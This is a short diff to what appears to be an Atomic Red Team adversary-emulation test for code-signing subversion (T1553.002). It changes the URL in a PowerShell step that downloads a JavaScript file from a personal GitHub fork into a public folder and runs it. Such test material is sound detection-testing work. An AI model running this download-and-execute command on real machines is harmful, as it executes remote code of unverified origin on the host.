@@ -9,7 +9,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      $URL = "https://github.com/crav3r/atomic-red-team/raw/round5test/atomics/T1553.002.js";
+      $URL = "https://github.com/crav3r/atomic-red-team/raw/round5test/atomics/T1553.002/bin/T1553.002.js"
       $PATH = "C:\Users\Public\a.js";
       (New-Object System.Net.WebClient).DownloadFile($URL, $Path);
       Start-Process $PATH;
